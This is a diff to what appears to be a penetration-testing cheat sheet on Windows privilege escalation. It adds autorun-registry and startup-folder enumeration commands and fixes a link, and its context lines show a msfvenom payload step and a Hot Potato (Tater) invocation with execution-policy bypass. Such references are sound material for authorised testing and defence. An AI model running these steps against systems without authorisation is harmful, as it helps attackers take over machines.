@@ -458,14 +458,17 @@ Search for modifiable directories which have autoruns
 
 ```powershell
 Get-ModifiableRegistryAutoRun  # PowerUp.ps1
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+Autoruns[64].exe               # SysinternalsSuite GUI
+autorunsc[64].exe              # SysinternalsSuite CLI
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\R"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
-reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService"
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService"
-reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService"
-reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
+reg query "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
+reg query "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunService"
+reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceService"
+reg query "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService"
+reg query "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
 ```
 
 ```powershell
@@ -548,7 +551,7 @@ msfvenom -p <payload> <payload params> -f exe -o <missing binary>.exe
 ---
 
 ## Hot Potato
-[Tater.ps1](https://github.com/Kevin-Robertson/Tater>
+[Tater.ps1](https://github.com/Kevin-Robertson/Tater)
 ```powershell
 powershell -nop -ep bypass
 Import-Module <Tater.ps1 path>
@@ -558,7 +561,11 @@ Invoke-Tater -Trigger 1 -Command <cmd>
 ---
 
 ## Startup Applications
-TODO
+```powershell
+wmic startup get caption,command
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 
+```
 
 ---
 
